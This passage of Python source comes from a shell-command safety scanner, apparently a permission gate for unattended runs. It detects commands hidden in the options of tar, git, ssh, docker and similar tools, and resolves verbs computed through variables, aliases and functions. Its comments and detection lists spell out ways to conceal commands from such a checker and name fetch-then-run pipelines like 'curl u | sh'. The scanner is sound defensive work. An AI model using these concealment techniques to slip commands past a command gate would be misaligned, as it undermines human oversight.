    """Programs tar runs: ``--to-command``, ``--checkpoint-action=exec=``, ``-I`` / ``-F`` and kin."""
    out = _option_values(args, _TAR_EXEC_LONGS, ("-I", "-F"))
    for v in _option_values(args, ("--checkpoint-action",)):
        for action in v.split(","):
            if action.startswith("exec="):
                out.append(action[5:])
    return out


_GIT_GLOBAL_VALUE_OPTS = frozenset({
    "-c", "-C", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--super-prefix", "--config-env",
})
_GIT_REMOTE_PROGRAM_SUBS = frozenset({"fetch", "pull", "clone", "push", "ls-remote", "archive", "remote", "submodule"})
_GIT_FILTER_OPTS = (
    "--env-filter", "--tree-filter", "--index-filter", "--parent-filter", "--msg-filter",
    "--commit-filter", "--tag-name-filter",
)


def _git_payloads(args: List[str]) -> List[str]:
    """Programs a git subcommand runs by option or operand (#9).

    The ``-c key=value`` / config-key half lives in ``_git_exec_config_payloads``;
    this is the rest of the surface: ``difftool -x``, ``--upload-pack`` /
    ``--receive-pack`` / ``--exec``, ``grep -O``, ``filter-branch --*-filter``,
    ``submodule foreach``, ``bisect run``, ``rebase -x`` and the SET form of an
    exec-valued config key (``git config core.editor <program>``).
    """
    i = 0
    while i < len(args) and args[i].startswith("-"):
        i += 2 if args[i] in _GIT_GLOBAL_VALUE_OPTS else 1
    if i >= len(args):
        return []
    sub, rest = args[i], args[i + 1 :]
    out: List[str] = []
    if sub in ("difftool", "mergetool"):
        out += _option_values(rest, ("--extcmd",), ("-x",))
    if sub == "rebase":
        out += _option_values(rest, ("--exec",), ("-x",))
    if sub in _GIT_REMOTE_PROGRAM_SUBS or sub == "rebase":
        out += _option_values(rest, ("--upload-pack", "--receive-pack", "--exec"))
    if sub == "clone":
        out += _option_values(rest, (), ("-u",))
        for entry in _option_values(rest, ("--config",), ("-c",)):
            key, _sep, value = entry.partition("=")
            if _git_exec_config_key(key):
                out.append(value)
            elif key.strip().lower().startswith("alias.") and value.startswith("!"):
                out.append(value[1:])
    if sub == "grep":
        out += [w[2:] for w in rest if w.startswith("-O") and len(w) > 2]
        out += _option_values(rest, ("--open-files-in-pager",))
    if sub == "filter-branch":
        out += _option_values(rest, _GIT_FILTER_OPTS)
    if sub == "submodule" and "foreach" in rest:
        tail = [w for w in rest[rest.index("foreach") + 1 :] if not w.startswith("--")]
        if tail:
            out.append(" ".join(tail))
    if sub == "bisect" and "run" in rest:
        tail = rest[rest.index("run") + 1 :]
        if tail:
            out.append(" ".join(_quote_word(w) for w in tail))
    if sub == "config":
        operands, j = [], 0
        while j < len(rest):
            w = rest[j]
            if w in ("-f", "--file", "--blob", "--type", "-t", "--default"):
                j += 2
                continue
            if not w.startswith("-"):
                operands.append(w)
            j += 1
        if len(operands) >= 2:
            key, value = operands[0], operands[1]
            if _git_exec_config_key(key):
                out.append(value)
            elif key.strip().lower().startswith("alias.") and value.startswith("!"):
                out.append(value[1:])
    return out


def _npm_payloads(base: str, args: List[str]) -> List[str]:
    """``npm exec -c '<cmd>'`` / ``npx -c '<cmd>'``: the string goes to a shell."""
    if base == "npm" and not any(w in ("exec", "x") for w in args[:3]):
        return []
    return _option_values(args, ("--call",), ("-c",))


_NET_EXEC_O_RE = _rx(r"^\s*(?:proxycommand|localcommand)(?:\s*=\s*|\s+)(.+)$", re.DOTALL | re.IGNORECASE)


def _net_payloads(base: str, args: List[str]) -> List[str]:
    """Programs ssh/scp/sftp run: ``-o ProxyCommand=…`` / ``LocalCommand=…`` and scp/sftp ``-S program``."""
    out: List[str] = []
    for opt in _option_values(args, (), ("-o",)):
        m = _NET_EXEC_O_RE.match(opt)
        if m:
            out.append(m.group(1))
    if base in ("scp", "sftp"):
        out += _option_values(args, (), ("-S",))
    return out


_HIDDEN_TOOLS = frozenset({
    "sed", "gsed", "awk", "gawk", "mawk", "tar", "gtar", "bsdtar", "git", "npm", "npx", "ssh", "scp", "sftp",
    "flock", "parallel", "docker", "podman", "nerdctl", "docker-compose", "kubectl", "oc",
})


def _flock_payloads(args: List[str]) -> List[str]:
    """``flock [opts] LOCK cmd …`` / ``flock LOCK -c 'cmd'``: the launched command (#14)."""
    value_opts = {"-w", "-E", "--timeout", "--wait", "--conflict-exit-code"}
    i = 0
    while i < len(args) and args[i].startswith("-") and args[i] != "--":
        i += 2 if args[i] in value_opts else 1
    if i < len(args) and args[i] == "--":
        i += 1
    rest = args[i + 1 :]  # args[i] is the lock file / fd
    if rest and re.fullmatch(r"-[A-Za-z]*c|--command", rest[0]):
        return rest[1:2]
    return [" ".join(_quote_word(w) for w in rest)] if rest else []


def _launcher_payloads(base: str, args: List[str]) -> List[str]:
    """The command a launcher runs, as a command in its own right (the eval table's twin for rules)."""
    if base == "flock":
        return _flock_payloads(args)
    if base == "parallel":
        cmd, repl = _parallel_command(args)
        if not cmd:
            return []
        if len(cmd) == 1 or any(ch.isspace() for ch in cmd[0]):
            # parallel hands a quoted command LINE to a shell, ``{}`` standing for each input
            line = _PARALLEL_REPLACEMENT.sub("x", cmd[0])
            if repl:
                line = line.replace(repl, "x")
            return [" ".join([line] + [_quote_word(w) for w in cmd[1:]])]
        return [" ".join(_quote_word(w) for w in cmd)]
    if base in ("kubectl", "oc"):  # ``kubectl exec POD -- cmd``
        if "--" in args and any(w in ("exec", "run") for w in args[: args.index("--")]):
            tail = args[args.index("--") + 1 :]
            return [" ".join(_quote_word(w) for w in tail)] if tail else []
        return []
    launched = _eval_container_command(args)
    return [" ".join(_quote_word(w) for w in launched)] if launched else []


def _exec_tool(words: List[str]) -> Tuple[Optional[str], List[str]]:
    """``(tool, its arguments)`` for a simple command, looking past assignments and wrapper chains."""
    wrapped = False
    for i, w in enumerate(words[:8]):
        base = w.rsplit("/", 1)[-1]
        if base in _HIDDEN_TOOLS:
            return base, words[i + 1 :]
        if _ASSIGN_TOKEN_RE.match(w):
            continue
        if base in _POSITION_WRAPPERS:
            wrapped = True
            continue
        if not wrapped:
            break
    return None, []


def _inner_hidden(payload: str, rules: bool, depth: int) -> List[str]:
    """Hidden commands of a wrapper's payload (``sh -c '…'``, ``ssh host '…'``), judged as a command itself."""
    return (
        _stdin_program_commands(payload, rules) + _procsub_bodies(payload)
        + _exec_payload_commands(payload, rules, depth + 1)
    )


def _exec_payload_commands(command: str, rules: bool = False, _depth: int = 0) -> List[str]:
    """Commands that the tools in ``command`` run from option values or embedded programs."""
    if _depth > _RESCAN_DEPTH:
        return []
    out: List[str] = []
    for words in _segment_raw_words(command):
        base, args = _exec_tool(words)
        if base in ("sed", "gsed"):
            out += _sed_payloads(args)
        elif base in ("awk", "gawk", "mawk"):
            out += _awk_payloads(args)
        elif base in ("tar", "gtar", "bsdtar"):
            out += _tar_payloads(args)
        elif base == "git":
            out += _git_payloads(args)
        elif base in ("npm", "npx"):
            out += _npm_payloads(base, args)
        elif base in ("ssh", "scp", "sftp"):
            out += _net_payloads(base, args)
        elif base in ("flock", "parallel", "docker", "podman", "nerdctl", "docker-compose", "kubectl", "oc"):
            out += _launcher_payloads(base, args)
        # A shell's ``-c`` text and an ssh remote command are judged by their own
        # rules where they sit; a hidden command INSIDE them is still hidden.
        k = next((j for j, w in enumerate(words) if not _ASSIGN_TOKEN_RE.match(w)), None)
        if k is not None:  # ``sudo|env|nohup|timeout N bash -c '…'``: the wrapped shell's payload is hidden too
            w = _wrapped_command_index(words[k:])
            k = k + w if w is not None else k
        head = words[k].rsplit("/", 1)[-1] if k is not None else ""
        if head in _SHELL_NAMES and head != "su":
            inner, _rest = _eval_shell_invocation(words[k + 1 :], False)
            if inner:
                out += _inner_hidden(inner, rules, _depth)
        elif base == "ssh":
            remote = " ".join(w for w in _ssh_remote_command(args) if w != "--")
            if remote:
                out += _inner_hidden(remote, rules, _depth)
    return [p for p in out if p.strip()]


def _hidden_commands(command: str, rules: bool = False) -> List[str]:
    """Every command hidden in ``command``: stdin programs, ``<(…)`` bodies, executed option values.

    ``rules`` selects the general rule scan (``_decide_command``); the protected-path scan keeps
    reading an interpreter's stdin as shell text too, as it always has (fail-closed net).
    """
    return list(dict.fromkeys(
        _stdin_program_commands(command, rules)
        + _procsub_bodies(command)
        + _exec_payload_commands(command, rules)
        + _indirect_verbs(command)[0]
    ))[:_RESCAN_FANOUT]


#
# INDIRECT VERBS (batch 4 of the DC residuals)
#
# A verb the shell computes is a verb nothing here can read: ``${cmds[0]} x``,
# ``alias a=touch; a x``, ``f() { $1 x; }; f touch``, ``x=ev;y=al; $x$y '…'``,
# ``for c in touch rm; do $c x; done``. Two answers, in this order:
#
#   1. RESOLVE what the same command defines — literal scalars (``=`` and
#      ``+=``), literal and associative arrays (``+=``, slices), for-lists,
#      ``set --``, aliases, function bodies, ``${x:=d}``-style defaults — and
#      judge each resolved command by the SAME engine (``_decide_command``
#      recurses through ``_hidden_commands``). A resolved command carries the
#      definitions with it, so a function calling a function, an alias chain
#      and a payload (``bash -c '$x'``) resolve the same way.
#   2. What cannot be resolved ASKS — but only where the shape says the verb is
#      truly unknown: a variable the command itself fills from ``read`` / a
#      glob (``unverifiable``), a variable filled by a substitution that is not
#      a pure lookup (an ordinary, bypass-demotable ask — the tier such
#      commands always had), a head spelled as a prefix of a builtin around an
#      expansion (``e${x}val``), or ANY unresolved verb in a command that names
#      a guarded path. A plain environment name (``$CC -o x``, ``$EDITOR f``,
#      ``./$script``, ``python$V``, ``"$@"``) is how scripts run programs, and
#      asking on it would be the silent loop of an unattended run — it passes.
#
# Piped programs from a producer the scanner cannot read (``cat x.sh | sh``,
# ``curl u | sh``) are the same class: fetched-then-run is BLOCKED, file-fed
# is an ask. The check runs on the command, on every ``-c`` / ssh payload in
# it, and on ``sh <(curl u)``.

_IND_SEP = r"(?:^|[;&|\n(){]|&&|\|\||!|\b(?:then|do|else|elif|if|while|until)\b)"
_IND_VALUE = r"""'[^']*'|"[^"]*"|\$\((?:[^()]|\([^()]*\))*\)|`[^`]*`|[^\s;|&()<>]*"""
_IND_ASSIGN_RE = re.compile(
    _IND_SEP + r"\s*(?:(?:export|readonly|local|declare(?:\s+-[A-Za-z]+)*|typeset)\s+)?"
    r"([A-Za-z_]\w*)(\+?)=(" + _IND_VALUE + ")"
)
_IND_ARRAY_RE = re.compile(
    _IND_SEP + r"\s*(?:(?:declare|local|typeset)\s+(?:-[A-Za-z]+\s+)*)?([A-Za-z_]\w*)(\+?)=\(([^()]*)\)"
)
_IND_SUBSCRIPT_RE = re.compile(
    _IND_SEP + r"\s*(?:(?:declare|local|typeset)\s+(?:-[A-Za-z]+\s+)*)?([A-Za-z_]\w*)\[([^\]$]+)\]=(" + _IND_VALUE + ")"
)
_IND_FOR_RE = re.compile(r"\b(?:for|select)\s+([A-Za-z_]\w*)\s+in\s+([^;\n]*?)\s*(?:;|\n)\s*do\b")
_IND_DYNAMIC_RE = re.compile(r"\b(?:read|mapfile|readarray)\b([^;&|\n]*)|\bprintf\s+-v\s+([A-Za-z_]\w*)")
_IND_ALIAS_RE = re.compile(_IND_SEP + r"\s*alias\s+([\w.@+-]+)=(" + _IND_VALUE + ")")
_IND_SET_RE = re.compile(_IND_SEP + r"\s*set\s+--(?:\s+([^;&|\n]*))?")
_IND_FUNC_RE = re.compile(_IND_SEP + r"\s*(?:function\s+)?([A-Za-z_][\w.-]*)\s*(\(\s*\))?\s*([{(])")
_IND_EXPANSION_RE = re.compile(
    r"\$(?:\{([A-Za-z_]\w*|\d+|[@*])(?:\[([^\]]*)\])?([:#%/@^,!+\-=?][^}]*)?\}|([A-Za-z_]\w*)|(\d|[@*]))"
)
_IND_PURE_HEAD_RE = re.compile(r"""^["']?\$(?:\{[^}]*\}|\w+|[@*#?!$-])["']?(?:/.*)?$""")
_IND_POSITIONAL_RE = re.compile(r"(\")?\$(?:\{(\d+|[@*#])\}|(\d|[@*#]))(?(1)\")")
_IND_SAFE_WORD_RE = re.compile(r"^[\w@%+=:,./~$*?\[\]{}^-]+$")
_IND_CANDIDATE_CAP = 16
# a construct that hands text to a shell: only there does a defined variable change what RUNS
_IND_FED_RE = re.compile(r"\|\s*(?:sudo\s+)?(?:\S*/)?(?:sh|bash|zsh|dash|ksh)\b|<<<|\benv\s+-S|\b(?:at|batch)\s+\S|<\(")
# the shell does not alias-expand or function-call these; resolving them would invent verbs
_IND_NOT_VERBS = frozenset({"alias", "unalias", "function", "export", "local", "declare", "readonly", "typeset", "unset", "set"})
# a verb a glued head could spell: the dynamic-evaluation and sourcing builtins
_IND_SPELLABLE = ("eval", "exec", "source", "builtin", "command", "trap", "coproc")
_IND_KEYWORDS = frozenset({"if", "while", "until", "for", "case", "select", "then", "do", "else", "elif", "function"})


def _redirect_width(word: str) -> int:
    """Words a redirect occupies: 1 for ``2>&1`` / ``>/dev/null``, 2 for a bare ``>``, 0 if ``word`` is not one."""
    if re.fullmatch(r"\d*[<>]+&\d+-?|\d*[<>]+[^\s<>&=][^\s]*|&>>?[^\s<>]\S*", word):
        return 1
    if re.fullmatch(r"\d*[<>]+|&>>?", word):
        return 2
    return 0


def _ind_quote(word: str, raw: bool) -> str:
    return word if raw or _IND_SAFE_WORD_RE.match(word) else shlex.quote(word)


def _ind_literal(value: str) -> Optional[str]:
    """The text of a quoted/unquoted assignment value, or None when it holds a substitution."""
    if value[:1] == "'" and value[-1:] == "'" and len(value) >= 2:
        return value[1:-1]
    if "$(" in value or "`" in value:
        return None
    if value[:1] == '"' and value[-1:] == '"' and len(value) >= 2:
        value = value[1:-1]
    return value


class _IndirectEnv:
    """What one command defines for itself: scalars and for-lists (multi-valued), arrays, aliases, functions."""

    def __init__(self, command: str) -> None:
        self.scalars: Dict[str, List[str]] = {}
        self.arrays: Dict[str, List[str]] = {}
        self.dynamic: Dict[str, Tuple[str, bool]] = {}
        self.subs: Dict[str, Dict[str, str]] = {}
        self.aliases: Dict[str, str] = {}
        self.functions: Dict[str, Tuple[str, str]] = {}
        self.positional: Optional[List[str]] = None
        self.body_free = command
        self._collect_functions(command)
        text = self.body_free
        for m in _IND_SET_RE.finditer(text):
            try:
                self.positional = shlex.split(m.group(1) or "")
            except ValueError:
                self.dynamic["$"] = ("an unparsable set --", True)
            if self.positional and any("$" in w or "`" in w for w in self.positional):
                self.positional = None
                self.dynamic["$"] = ("positional parameters set from an expansion", True)
        for m in _IND_ARRAY_RE.finditer(text):
            name, plus, body = m.group(1), m.group(2), m.group(3)
            if "$" in body or "`" in body:
                self.dynamic[name] = ("an array filled from an expansion", True)
                continue
            try:
                items = [re.sub(r"^\[[^\]]*\]=", "", w) for w in shlex.split(body)]
            except ValueError:
                self.dynamic[name] = ("an unparsable array", True)
                continue
            self.arrays[name] = (self.arrays.get(name, []) if plus else []) + items
        for m in _IND_SUBSCRIPT_RE.finditer(text):
            value = _ind_literal(m.group(3))
            if value is None or "$" in value:
                self.dynamic[m.group(1)] = ("an element assigned from an expansion", False)
            else:
                self.subs.setdefault(m.group(1), {})[m.group(2).strip("'\"")] = value
        for m in _IND_ASSIGN_RE.finditer(text):
            name, plus, raw = m.group(1), m.group(2), m.group(3)
            value = _ind_literal(raw)
            if value is not None and "$" in value:
                resolved = self.expand(value)
                value = resolved[0] if resolved else None
            if value is None:
                self.dynamic[name] = ("a variable the command fills from a substitution", False)
            elif plus and self.scalars.get(name):
                self.scalars[name] = [v + value for v in self.scalars[name]]
            else:
                self.scalars.setdefault(name, []).append(value)
        for m in _IND_FOR_RE.finditer(text):
            name, items = m.group(1), m.group(2)
            try:
                words = shlex.split(items)
            except ValueError:
                words = None
            if words is None or any(re.search(r"[$`*?\[]", w) for w in words):
                self.dynamic[name] = (
                    "a loop variable over a list the shell computes",
                    words is None or not any(("$(" in w or "`" in w) for w in words),
                )
            else:
                expanded: List[str] = []
                for w in words:
                    expanded.extend(_eval_brace_expand(w) if "{" in w else [w])
                self.scalars.setdefault(name, []).extend(expanded)
        for m in _IND_DYNAMIC_RE.finditer(text):
            names = [w for w in (m.group(1) or m.group(2) or "").split() if re.fullmatch(r"[A-Za-z_]\w*", w)]
            for name in names or ["REPLY"]:
                self.dynamic[name] = ("a variable filled by read", True)
        for m in _IND_ALIAS_RE.finditer(text):
            value = _ind_literal(m.group(2))
            if value is None:
                self.dynamic["alias:" + m.group(1)] = ("an alias defined from a substitution", False)
            else:
                self.aliases[m.group(1)] = value

    def _collect_functions(self, command: str) -> None:
        """Function bodies by bracket matching; ``body_free`` is the command with each definition blanked."""
        out, pos = [], 0
        for m in _IND_FUNC_RE.finditer(command):
            name, parens, opener = m.group(1), m.group(2), m.group(3)
            if m.start() < pos or name in _IND_NOT_VERBS or name in _IND_KEYWORDS:
                continue
            if not parens and "function" not in command[m.start() : m.start(1)]:
                continue
            close = "}" if opener == "{" else ")"
            depth, i, quote = 1, m.end(), ""
            while i < len(command) and depth:
                c = command[i]
                if quote:
                    if c == "\\" and quote == '"':
                        i += 1
                    elif c == quote:
                        quote = ""
                elif c in "'\"":
                    quote = c
                elif c == "\\":
                    i += 1
                elif c == opener:
                    depth += 1
                elif c == close:
                    depth -= 1
                i += 1
            if depth:
                self.dynamic["function:" + name] = ("an unterminated function body", True)
                continue
            self.functions[name] = (opener, command[m.end() : i - 1])
            out.append(command[pos : m.end(1)] + " :")
            pos = i
        out.append(command[pos:])
        if self.functions:
            self.body_free = "".join(out)

    def expand(self, word: str) -> Optional[List[str]]:
        """Every literal value ``word`` can take, or None when a name in it is filled at run time.

        A name this command does not define is an ENVIRONMENT name: it stays in the text (the head
        classification decides what that is worth), and a ``${x:-d}``-style default adds ``d``.
        """
        results = [word]
        for m in _IND_EXPANSION_RE.finditer(word):
            name = m.group(1) or m.group(4) or m.group(5)
            index, mod = m.group(2), m.group(3) or ""
            if name in self.dynamic:
                return None
            extra: List[str] = []
            if name.isdigit() or name in ("@", "*"):
                if self.positional is None:
                    continue
                if name in ("@", "*"):
                    choices = [" ".join(self.positional)]
                else:
                    choices = self.positional[int(name) - 1 : int(name)] or [""]
            elif name in self.subs and name not in self.arrays:
                known = self.subs[name]
                key = (index or "0").strip("'\"")
                choices = [known[key]] if key in known else list(known.values())
            elif name in self.arrays:
                items = self.arrays[name]
                if index in ("@", "*"):
                    sl = re.fullmatch(r":(\d+)(?::(\d+))?", mod)
                    if sl:
                        start = int(sl.group(1))
                        items = items[start : start + int(sl.group(2))] if sl.group(2) else items[start:]
                    choices = [" ".join(items)] + (items if sl else [])
                elif index is not None and index.isdigit():
                    choices = items[int(index) : int(index) + 1] or [""]
                else:
                    choices = items or [""]
            elif name in self.scalars and (index is None or index == "0"):
                choices = list(self.scalars[name])
                if mod[:1] in ("^", ","):
                    choices += [c.upper() if mod[0] == "^" else c.lower() for c in choices]
            else:
                if mod[:2] in (":-", ":=", ":+") or mod[:1] in ("-", "=", "+"):
                    extra = [mod.lstrip(":")[1:]]
                if not extra:
                    continue  # an environment name: stays in the text for the head classification
                choices = extra
            repl = [r.replace(m.group(0), c) for r in results for c in choices]
            results = (repl + (results if extra else []))[:_IND_CANDIDATE_CAP]
        return results

    def computes_a_verb(self, body: str) -> str:
        """``"args"`` when a function body runs a verb its arguments (or another function) supply, ``"var"``
        for any other computed verb, ``""`` when every verb in it is a literal (the body is scanned where it sits)."""
        kind = ""
        for toks in _ind_segments(body):
            head = _ind_head(toks)
            if head is None:
                continue
            text = toks[head][0]
            if _IND_POSITIONAL_RE.search(text) or text in self.functions or text in self.aliases:
                return "args"
            if "$" in text:
                kind = "var"
        return kind

    def preamble(self, needed: str = "") -> str:
        """The definitions ``needed`` (and what they need) mentions, replayed ahead of a rebuilt command.

        Only what the rebuilt text refers to travels with it: dragging every function body along
        re-scans the whole command once per resolved verb.
        """
        wanted = {"text": needed}

        def mentions(name: str, sigil: str = r"\b") -> bool:
            return bool(re.search(sigil + re.escape(name) + r"\b", wanted["text"]))

        lines: Dict[str, str] = {}
        for _ in range(3):  # a definition can pull in another
            for n, v in self.scalars.items():
                if n not in lines and mentions(n, r"\$\{?"):
                    lines[n] = f"{n}={shlex.quote(v[0])}"
            for n, v in self.arrays.items():
                if n not in lines and mentions(n, r"\$\{?"):
                    lines[n] = f"{n}=({' '.join(shlex.quote(i) for i in v)})"
            for n, v in self.subs.items():
                if "sub " + n not in lines and mentions(n, r"\$\{?"):
                    lines["sub " + n] = "\n".join(f"{n}[{k}]={shlex.quote(x)}" for k, x in v.items())
            for n, v in self.aliases.items():
                if "alias " + n not in lines and mentions(n):
                    lines["alias " + n] = f"alias {n}={shlex.quote(v)}"
            for n, (opener, body) in self.functions.items():
                if "fn " + n not in lines and mentions(n):
                    lines["fn " + n] = f"{n}() {opener} {body}\n{'}' if opener == '{' else ')'}"
            wanted["text"] = needed + "\n" + "\n".join(lines.values())
        if self.positional is not None and _IND_POSITIONAL_RE.search(wanted["text"]):
            lines["set"] = "set -- " + " ".join(shlex.quote(w) for w in self.positional)
        return "\n".join(lines.values()) + "\n" if lines else ""

    def substituted(self, command: str) -> List[str]:
        """``command`` with defined scalars replaced outside single quotes — what a fed program really contains."""
        if not self.scalars:
            return []
        out: List[str] = []
        for k in range(1):
            buf, i, n, single = [], 0, len(command), False
            while i < n:
                ch = command[i]
                if ch == "'" :
                    single = not single
                if not single and ch == "$":
                    m = _IND_EXPANSION_RE.match(command, i)
                    name = (m.group(1) or m.group(4)) if m else None
                    if m and name in self.scalars and not m.group(2) and not m.group(3):
                        vals = self.scalars[name]
                        buf.append(vals[min(k, len(vals) - 1)])
                        i = m.end()
                        continue
                buf.append(ch)
                i += 1
            text = "".join(buf)
            if text != command and text not in out:
                out.append(text)
        return out


def _ind_segments(command: str) -> List[List[Tuple[str, bool, bool]]]:
    # ``$x"al"`` reads as the variable ``xal`` once the quotes are resolved; close the name first
    command = re.sub(r"\$([A-Za-z_]\w*)(?=[\"'])", r"${\1}", command)
    masked, mask_err = _mask_command_substitutions(inert_view(command))
    return [strip_command_openers(t) for t in _scan_masked_tokens(_strip_heredoc_bodies(command if mask_err else masked))]


def _ind_head(toks: List[Tuple[str, bool, bool]]) -> Optional[int]:
    """Index of the token that names the program: past assignments, redirects and launcher chains."""
    i, n, prev_option = 0, len(toks), False
    while i < n:
        text, fq, _ex = toks[i]
        if not fq:
            width = _redirect_width(text)
            if width or _ASSIGN_TOKEN_RE.match(text):
                i += width or 1
                continue
        base = text.rsplit("/", 1)[-1]
        if base in _POSITION_WRAPPERS:
            prev_option = False
        elif text.startswith("-") and not fq:
            prev_option = True
        elif prev_option or text[:1].isdigit():
            prev_option = False
        else:
            return i
        i += 1
    return None


def _ind_rebuild(toks: List[Tuple[str, bool, bool]], head: int, replacement: List[str]) -> str:
    def word(t: str, fq: bool) -> str:
        return _ind_quote(t, not fq and (bool(_redirect_width(t)) or "$" in t))

    words = [word(t, fq) for t, fq, _ex in toks[:head]]
    words += [_ind_quote(w, False) for w in replacement]
    words += [word(t, fq) for t, fq, _ex in toks[head + 1 :]]
    return " ".join(words)


def _ind_function_call(body: str, args: List[str]) -> str:
    """A function body with its positional parameters replaced by the call's arguments."""
    quoted = [_ind_quote(a, False) for a in args]

    def sub(m: "re.Match[str]") -> str:
        key = m.group(2) or m.group(3)
        if key in ("@", "*"):
            return " ".join(quoted)
        if key == "#":
            return str(len(args))
        idx = int(key)
        return quoted[idx - 1] if 0 < idx <= len(quoted) else ""

    return _IND_POSITIONAL_RE.sub(sub, body)


def _ind_head_unresolved(text: str, guarded: bool) -> Optional[Tuple[str, bool]]:
    """Why an expansion head this command does not define is worth an ask, or None when it is an environment name."""
    if _IND_PURE_HEAD_RE.match(text):
        why = None
    else:
        before = text.split("$", 1)[0]
        if "/" in before or not before or not any(s.startswith(before) for s in _IND_SPELLABLE):
            why = None  # a path, a plain name with a suffix, or glued environment names cannot spell a builtin
        else:
            why = ("a verb spelled by joining expansions", True)
    if why is None and guarded:
        why = ("an expansion the command does not define, in a command that names a guarded path", True)
    return why


def _indirect_verbs(command: str, guarded: bool = False, _depth: int = 0, _outer: str = "") -> Tuple[List[str], Optional[Tuple[str, bool]]]:
    """``(resolved commands, (reason, unverifiable))`` for every computed verb in ``command``.

    ``_outer`` is the definitions of the command this one is a payload of: an exported variable
    reaches ``bash -c '$x'``, and the payload is judged with it.
    """
    if _depth > _RESCAN_DEPTH or (
        "$" not in command and "alias" not in command and "()" not in command and "function" not in command
    ):
        return [], None
    env = _IndirectEnv(_outer + command)
    resolved: List[str] = []
    called: set = set()
    unresolved: Optional[Tuple[str, bool]] = None
    for toks in _ind_segments(env.body_free):
        head = _ind_head(toks)
        if head is None:
            continue
        text, _fq, ex = toks[head]
        if ex or text in _IND_NOT_VERBS or _CMD_SUBST_SENTINEL in text:
            continue  # a substitution in the verb slot is the concealment path's, not this one's
        args = [t for t, _f, _e in toks[head + 1 :]]
        if text in env.functions:
            kind = env.computes_a_verb(env.functions[text][1])
            # a verb taken from the ARGUMENTS differs per call; one taken from a variable is the same every time
            if kind and (kind == "args" or text not in called):
                body = _ind_function_call(env.functions[text][1], args)
                resolved.append(env.preamble(body) + body)
                called.add(text)
            continue
        if text in env.aliases:
            try:
                replacement = shlex.split(env.aliases[text])
            except ValueError:
                replacement = []
            if replacement:
                rebuilt = _ind_rebuild(toks, head, replacement)
                resolved.append(env.preamble(rebuilt) + rebuilt)
            continue
        if "alias:" + text in env.dynamic:
            unresolved = unresolved or env.dynamic["alias:" + text]
            continue
        if "$" not in text:
            continue
        names = [m.group(1) or m.group(4) or m.group(5) for m in _IND_EXPANSION_RE.finditer(text)]
        why = next((env.dynamic[n] for n in names if n in env.dynamic), None)
        values = env.expand(text) if why is None else None
        for value in values or []:
            if "$" not in value:
                try:
                    replacement = shlex.split(value)
                except ValueError:
                    replacement = [value]
                if replacement and replacement != [text]:
                    rebuilt = _ind_rebuild(toks, head, replacement)
                resolved.append(env.preamble(rebuilt) + rebuilt)
            elif why is None:
                why = _ind_head_unresolved(value, guarded)
        if why is not None and unresolved is None:
            unresolved = why
    if _IND_FED_RE.search(command):
        resolved += env.substituted(command)
    for payload in _shell_payloads(command):
        inner, why = _indirect_verbs(payload, guarded, _depth + 1, env.preamble(payload))
        resolved += inner
        unresolved = unresolved or why
    return resolved[:12], unresolved


def _shell_payloads(command: str) -> List[str]:
    """The ``-c`` text of a shell and the remote command of an ssh in ``command``."""
    out: List[str] = []
    for words in _segment_raw_words(command):
        k = next((j for j, w in enumerate(words) if not _ASSIGN_TOKEN_RE.match(w)), None)
        head = words[k].rsplit("/", 1)[-1] if k is not None else ""
        if head in _SHELL_NAMES and head != "su":
            inner, _rest = _eval_shell_invocation(words[k + 1 :], False)
            if inner:
                out.append(inner)
        elif head in ("ssh", "timeout", "env", "sudo", "nohup", "time", "exec", "command", "doas"):
            base, args = _exec_tool(words)
            if base == "ssh":
                remote = " ".join(w for w in _ssh_remote_command(args) if w != "--")
                if remote:
                    out.append(remote)
            else:
                for j, w in enumerate(words[k + 1 :], k + 1):
                    if w.rsplit("/", 1)[-1] in _SHELL_NAMES and w != "su":
                        inner, _rest = _eval_shell_invocation(words[j + 1 :], False)
                        if inner:
                            out.append(inner)
                        break
    return out


_FETCH_PROGRAMS = frozenset({"curl", "wget", "fetch", "aria2c", "http", "https", "xh", "lwp-request", "ftp"})
_PRODUCER_READABLE = frozenset({"echo", "printf"})
_STDIN_INTERPRETERS = frozenset({
    "python", "python2", "python3", "perl", "ruby", "node", "php", "deno", "bun",
    "lua", "luajit", "tclsh", "Rscript", "julia", "groovy", "osascript",
})
_SUDO_VALUE_OPTS = frozenset({"-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U", "-r", "-t"})
_WRAPPER_WORDS = frozenset({"sudo", "doas", "exec", "env", "command", "time", "nohup", "busybox", "builtin", "nice", "stdbuf"})


def _ind_clean_words(stage: str) -> List[str]:
    """A stage's words past openers, group parens and redirects (a redirect is not an operand)."""
    words = [w.strip("{}") for w in strip_command_opener_words(_words(re.sub(r"(?<!\$)[()]", " ", stage)))]
    out: List[str] = []
    i = 0
    while i < len(words):
        w = words[i]
        width = _redirect_width(w) if w else 0
        if width:
            i += width
            continue
        if w:
            out.append(w)
        i += 1
    return out


def _ind_program_words(stage: str) -> List[str]:
    """The words of ``stage`` from the program it runs: past assignments and wrappers (``sudo -u root``, ``env -i``, ``busybox``)."""
    words = _ind_clean_words(stage)
    while words:
        w = os.path.basename(words[0])
        if _ASSIGN_WORD.match(words[0]):
            words = words[1:]
        elif w in _WRAPPER_WORDS:
            words = words[1:]
            while words and words[0].startswith("-") and words[0] != "--":
                words = words[2:] if words[0] in _SUDO_VALUE_OPTS else words[1:]
            if words and words[0] == "--":
                words = words[1:]
        else:
            break
    return words


def _stdin_program_consumer(stage: str) -> bool:
    """A shell (or interpreter) at the head of ``stage`` with no program of its own: it runs its stdin."""
    words = _ind_program_words(stage)
    if not words:
        return False
    head, args = os.path.basename(words[0]), words[1:]
    if head in _SHELL_NAMES - {"su"}:
        if any(re.fullmatch(r"-[A-Za-z]*c|--command(?:=.*)?", a) for a in args):
            return False
        if any(re.fullmatch(r"-[A-Za-z]*n[A-Za-z]*", a) for a in args):
            return False  # -n parses and runs nothing
        operands = [a for a in args if not a.startswith("-")]
        return not operands or any(re.fullmatch(r"-[A-Za-z]*s", a) for a in args)
    if head in _STDIN_INTERPRETERS:
        return all(a == "-" for a in args)
    return False


def _echoes_its_text(stage: str) -> bool:
    """Whether the stage's command is ``echo``/``printf`` — text written in the command, past openers and wrappers."""
    words = _ind_clean_words(stage)
    if words and words[0] == "case":
        words = words[next((k + 2 for k, w in enumerate(words) if w == "in"), len(words)) :]  # `case x in pat)`
    for w in words:
        base = os.path.basename(w)
        if base in _PRODUCER_READABLE:
            return True
        if not (_ASSIGN_WORD.match(w) or base in _POSITION_WRAPPERS or base in _WRAPPER_WORDS or w.startswith("-") or w[:1].isdigit()):
